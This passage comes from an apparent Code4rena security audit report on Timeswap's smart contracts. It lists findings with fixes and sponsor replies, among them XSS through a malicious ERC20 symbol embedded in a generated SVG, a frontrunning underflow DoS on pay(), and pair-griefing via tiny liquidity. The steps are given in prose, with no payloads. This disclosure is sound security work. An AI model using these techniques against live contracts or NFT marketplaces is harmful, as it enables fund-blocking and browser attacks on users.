href=\"https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39\">https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39</a></p>\n<h4 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>The root cause is <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L20\">line 20</a>  of the <code>safeSymbol()</code> function in SafeMetadata.sol</p>\n<p>The <code>safeSymbol()</code> function is called in:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L27-L31\">Bond.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L38-L42\">CollateralizedDebt.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L29-L33\">Insurance.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L31-L35\">Liquidity.sol</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Use the BoringCrypto <code>safeSymbol()</code> function code with the <code>returnDataToString()</code> parsing function to handle the case of a bytes32 return value:\n<a href=\"https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39\">https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L39</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/114\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/59\">https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/59</a></p>\n</blockquote>\n<h2 id=\"m-05-xss-via-svg-construction-contract\" style=\"position:relative;\"><a href=\"#m-05-xss-via-svg-construction-contract\" aria-label=\"m 05 xss via svg construction contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/131\">[M-05] XSS via SVG Construction contract</a></h2>\n<p><em>Submitted by thank</em>you, also found by 0x1f8b_</p>\n<p>SVG is a unique type of image file format that is often susceptible to Cross-site scripting. If a malicious user is able to inject malicious Javascript into a SVG file, then any user who views the SVG on a website will be susceptible to XSS. This can lead stolen cookies, Denial of Service attacks, and more.</p>\n<p>The <code>NFTTokenURIScaffold</code> contract generates a SVG via the <code>NFTSVG.constructSVG</code> function. One of the arguments used by the <code>NFTSVG.constructSVG</code> function is <code>svgTitle</code> which represents the ERC20 symbols of both the asset and collateral ERC20 tokens. When generating an ERC20 contract, a malicious user can set malicious XSS as the ERC20 symbol.</p>\n<p>These set of circumstances leads to XSS when the SVG is loaded on any website.</p>\n<h4 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ol>\n<li>Hacker generates an ERC20 token with a symbol that contains malicious Javascript.</li>\n<li>Hacker generates a TimeSwap Pair with an asset or collateral that matches the malicious ERC20 token created in Step 1.</li>\n<li>When <code>NFTTokenURIScaffold#constructTokenURI</code> is called, a SVG is generated. This process works such that when generating the SVG the tainted ERC20 symbol created in Step 1 is <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L90\">passed</a> to the <code>NFTSVG.constructSVG</code> function <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L102\">here</a>. This function returns a SVG <a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTSVG.sol#L27\">containing</a> the tainted ERC20 symbol.</li>\n<li>When the SVG is loaded on any site such as OpenSea, any user viewing that SVG will load the malicious Javascript from within the SVG and result in a XSS attack.</li>\n</ol>\n<h4 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Creating a SVG file inside of a Solidity contract is novel and thus requires the entity creating a SVG file to sanitize any potential user-input that goes into generating the SVG file.</p>\n<p>As of this time there are no known Solidity libraries that sanitize text to prevent an XSS attack. The easiest solution is to remove all user-input data from the SVG file or not generate the SVG at all.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/131\">Mathepreneur (Timeswap) confirmed</a>:</strong></p>\n<blockquote>\n<p>We plan to add Safety String library.</p>\n</blockquote>\n<h2 id=\"m-06-timeswappairsolmint-malicious-userattacker-can-mint-new-liquidity-with-an-extremely-small-amount-of-yincrease-and-malfunction-the-pair-with-the-maturity\" style=\"position:relative;\"><a href=\"#m-06-timeswappairsolmint-malicious-userattacker-can-mint-new-liquidity-with-an-extremely-small-amount-of-yincrease-and-malfunction-the-pair-with-the-maturity\" aria-label=\"m 06 timeswappairsolmint malicious userattacker can mint new liquidity with an extremely small amount of yincrease and malfunction the pair with the maturity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/165\">[M-06] <code>TimeswapPair.sol#mint()</code> Malicious user/attacker can mint new liquidity with an extremely small amount of <code>yIncrease</code> and malfunction the pair with the maturity</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34</a></p>\n<p>The current implementation of <code>TimeswapPair.sol#mint()</code> allows the caller to specify an arbitrary value for <code>yIncrease</code>.</p>\n<p>However, since <code>state.y</code> is expected to be a large number based at <code>2**32</code>, once the initial <code>state.y</code> is set to a small number (1 wei for example), the algorithm won’t effectively change <code>state.y</code> with regular market operations (<code>borrow</code>, <code>lend</code> and <code>mint</code>).</p>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37\">https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37</a></p>\n<p>The pair with the maturity will malfunction and can only be abandoned.</p>\n<p>A malicious user/attacker can use this to frontrun other users or the platform’s <code>newLiquidity()</code> call to initiate a griefing attack.</p>\n<p>If the desired <code>maturity</code> is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.</p>\n<h4 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h4>\n<p>Consider adding validation of minimal <code>state.y</code> for new liquidity.</p>\n<p>Can be <code>2**32 / 10000</code> for example.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/165\">Mathepreneur (Timeswap) confirmed</a></strong></p>\n<h2 id=\"m-07-no-reentrancy-guard-on-mint-function-that-has-a-callback-\" style=\"position:relative;\"><a href=\"#m-07-no-reentrancy-guard-on-mint-function-that-has-a-callback-\" aria-label=\"m 07 no reentrancy guard on mint function that has a callback  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/43\">[M-07] no reentrancy guard on mint() function that has a callback </a></h2>\n<p><em>Submitted by jayjonah8, also found by Fitraldys</em></p>\n<p>In CollateralizedDebt.sol, the mint() function calls _safeMint() which has a callback to the “to” address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.</p>\n<h4 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/43\">Mathepreneur (Timeswap) confirmed</a></strong></p>\n<h2 id=\"m-08-users-might-pay-enormous-amounts-of-gas\" style=\"position:relative;\"><a href=\"#m-08-users-might-pay-enormous-amounts-of-gas\" aria-label=\"m 08 users might pay enormous amounts of gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/74\">[M-08] users might pay enormous amounts of gas</a></h2>\n<p><em>Submitted by danb</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L141\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L141</a></p>\n<p>when a user mints new liquidity, it the pair doesn’t already exist, it deploys it.</p>\n<p>deploying a new contract on ethereum is super expensive, especially when it’s such a large contract like TimeswapPair, it can cost thousands of dollars.</p>\n<p><a href=\"https://medium.com/the-capital/how-much-does-it-cost-to-deploy-a-smart-contract-on-ethereum-11bcd64da1\">https://medium.com/the-capital/how-much-does-it-cost-to-deploy-a-smart-contract-on-ethereum-11bcd64da1</a></p>\n<h4 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>user who try to mint liquidity on pair that doesn’t exist will end up paying thousands of dollars.</p>\n<h4 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>If the pair doesn’t exist, revert instead of deploying it.\ndeploying a new contract should be the user’s choice, since it’s so expensive.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/74\">Mathepreneur (Timeswap) acknowledged</a>:</strong></p>\n<blockquote>\n<p>We plan to have a better documentation to show this behavior.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/74#issuecomment-1021355163\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Downgrading to med risk, this isn’t an attack vector and is working as designed.  Funds aren’t being lost or compromised in any way.</p>\n<p>The issue is with the design, which could be potentially improved.</p>\n</blockquote>\n<h2 id=\"m-09-dos-pay-function\" style=\"position:relative;\"><a href=\"#m-09-dos-pay-function\" aria-label=\"m 09 dos pay function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/86\">[M-09] DOS pay function</a></h2>\n<p><em>Submitted by egjlmn1</em></p>\n<p>in the <code>pay()</code> function users repay their debt and in line 364:\n<a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364</a>\nit decreases their debt.</p>\n<p>lets say a user wants to repay all his debt, he calls the <code>pay()</code> function with his full debt.\nan attacker can see it and frontrun to repay a single token for his debt (since it’s likely the token uses 18 decimals, a single token is worth almost nothing)\nand since your solidity version is above 0.8.0 the line:\n<code>due.debt -= assetsIn[i];</code> will revert due to underflow</p>\n<p>The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0$ (18 decimals) the attacker doesn’t lose real money</p>\n<h4 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>A DoS on every user that  repay his full debt (or enough that the difference between his total debt to what he pays his negligible)</p>\n<h4 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>From solidity docs</p>\n<p>Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.</p>\n<h4 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>if <code>assetsIn[i]</code> is bigger than <code>due.debt</code> set <code>assetsIn[i]=due.debt</code> and <code>due.debt=0</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/86\">Mathepreneur (Timeswap) acknowledged</a>:</strong></p>\n<blockquote>\n<p>The convenience contract will implement how much asset to pay in.</p>\n</blockquote>\n<h2 id=\"m-10-convenience-contract-fails-to-function-if-asset-or-collateral-is-an-erc20-token-with-fees\" style=\"position:relative;\"><a href=\"#m-10-convenience-contract-fails-to-function-if-asset-or-collateral-is-an-erc20-token-with-fees\" aria-label=\"m 10 convenience contract fails to function if asset or collateral is an erc20 token with fees permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/93\">[M-10] Convenience contract fails to function if asset or collateral is an ERC20 token with fees</a></h2>\n<p><em>Submitted by Ruhum</em></p>\n<p>There are ERC20 tokens that collect fees with each transfer. If the asset or collateral used in a pair is of that type, the Convenience contract fails to function. It always sends the flat amount specified in the function’s parameter. If the token collects fees, the amount the Pair contract receives is less than it expects to get and reverts the transaction.</p>\n<h4 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 